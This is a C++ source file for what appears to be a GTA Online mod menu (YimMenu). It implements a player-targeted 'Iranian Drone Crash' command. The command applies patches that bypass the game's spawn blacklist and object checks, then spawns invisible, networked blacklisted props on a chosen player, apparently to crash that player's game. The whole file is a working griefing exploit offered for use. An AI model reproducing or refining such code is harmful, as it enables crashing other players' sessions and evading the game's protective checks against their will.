#include "game/commands/PlayerCommand.hpp"
#include "game/gta/Natives.hpp"
#include "game/pointers/Pointers.hpp"
#include "core/backend/ScriptMgr.hpp"
#include "core/frontend/Notifications.hpp"

namespace YimMenu::Features
{
	static constexpr Hash PROP_LOG_AA_HASH = 0xC50A4285; // prop_log_aa

	class IranianDroneCrash : public PlayerCommand
	{
		using PlayerCommand::PlayerCommand;

		virtual void OnCall(Player player) override
		{
			auto ped = player.GetPed();
			if (!ped || !ped->IsValid())
			{
				LOG(WARNING) << "IranianDroneCrash: Invalid target ped";
				Notifications::Show("Iranian Drone Crash", "Invalid target player", NotificationType::Error);
				return;
			}

			auto pos = ped.GetPosition();
			if (pos.x == 0.0f && pos.y == 0.0f)
			{
				LOG(WARNING) << "IranianDroneCrash: Invalid position";
				return;
			}

			int spawned = 0;

			LOG(INFO) << "IranianDroneCrash: Starting blacklisted spawn test...";

			// Apply bypass patches SEKALI sahaja
			if (Pointers.ModelSpawnBypass)
			{
				Pointers.ModelSpawnBypass->Apply();
				LOG(INFO) << "  ModelSpawnBypass: APPLIED";
			}
			if (Pointers.WorldModelSpawnBypass)
			{
				Pointers.WorldModelSpawnBypass->Apply();
				LOG(INFO) << "  WorldModelSpawnBypass: APPLIED";
			}
			if (Pointers.PseudoObjectCheck)
			{
				Pointers.PseudoObjectCheck->Apply();
				LOG(INFO) << "  PseudoObjectCheck: APPLIED";
			}
			if (Pointers.SpectatePatch)
			{
				Pointers.SpectatePatch->Apply();
				LOG(INFO) << "  SpectatePatch: APPLIED";
			}

			// Request model dengan timeout lebih panjang
			LOG(INFO) << "IranianDroneCrash: Requesting model 0x" << std::hex << PROP_LOG_AA_HASH;
			STREAMING::REQUEST_MODEL(PROP_LOG_AA_HASH);

			bool modelLoaded = false;
			for (int i = 0; i < 150; ++i)   // ~3 saat maksimum
			{
				if (STREAMING::HAS_MODEL_LOADED(PROP_LOG_AA_HASH))
				{
					modelLoaded = true;
					break;
				}
				ScriptMgr::Yield(0);
				STREAMING::REQUEST_MODEL(PROP_LOG_AA_HASH);
			}

			if (!modelLoaded)
			{
				LOG(WARNING) << "IranianDroneCrash: Model load TIMED OUT";
				Notifications::Show("Iranian Drone Crash", "Failed to load blacklisted model", NotificationType::Error);
				goto cleanup;
			}

			LOG(INFO) << "IranianDroneCrash: Blacklisted model loaded successfully";

			// Spawn dengan lebih perlahan dan selamat
			for (int i = 0; i < 10; ++i)   // kurangkan ke 10 dulu
			{
				float offsetX = (i % 5) * 1.5f;
				float offsetY = (i / 5) * 1.5f;

				// Spawn di atas player (bukan bawah map)
				Vector3 spawnPos = { pos.x + offsetX, pos.y + offsetY, pos.z + 3.0f };

				auto handle = OBJECT::CREATE_OBJECT_NO_OFFSET(
					PROP_LOG_AA_HASH, 
					spawnPos.x, spawnPos.y, spawnPos.z, 
					true, false, false, 0
				);

				if (handle != 0 && ENTITY::DOES_ENTITY_EXIST(handle))
				{
					ENTITY::SET_ENTITY_VISIBLE(handle, FALSE, FALSE);
					ENTITY::FREEZE_ENTITY_POSITION(handle, FALSE);

					// Force yang jauh lebih kecil dan selamat
					ENTITY::APPLY_FORCE_TO_ENTITY(handle, 1, 0.0f, 0.0f, 10.0f, 0.0f, 0.0f, 0.0f, 0, 
						TRUE, TRUE, TRUE, FALSE, TRUE);

					spawned++;
					LOG(INFO) << "IranianDroneCrash: Spawned object " << i << " | Handle: " << handle;
				}
				else
				{
					LOG(WARNING) << "IranianDroneCrash: Failed to create object " << i;
				}

				ScriptMgr::Yield(20);   // yield lebih lama supaya game tak overload
			}

			LOG(INFO) << "IranianDroneCrash: Successfully spawned " << spawned << " blacklisted objects";

			if (spawned > 0)
				Notifications::Show("Iranian Drone Crash", std::format("Spawned {} blacklisted objects", spawned), NotificationType::Success);
			else
				Notifications::Show("Iranian Drone Crash", "No objects spawned", NotificationType::Error);

		cleanup:
			// Restore semua patch
			if (Pointers.SpectatePatch)     Pointers.SpectatePatch->Restore();
			if (Pointers.PseudoObjectCheck) Pointers.PseudoObjectCheck->Restore();
			if (Pointers.WorldModelSpawnBypass) Pointers.WorldModelSpawnBypass->Restore();
			if (Pointers.ModelSpawnBypass)  Pointers.ModelSpawnBypass->Restore();

			STREAMING::SET_MODEL_AS_NO_LONGER_NEEDED(PROP_LOG_AA_HASH);
			LOG(INFO) << "IranianDroneCrash: All patches restored";
		}
	};

	static IranianDroneCrash _IranianDroneCrash{"iraniandrone", "Iranian Drone Crash", "Spawns prop_log_aa (blacklisted) - Test Blacklist Bypass"};
}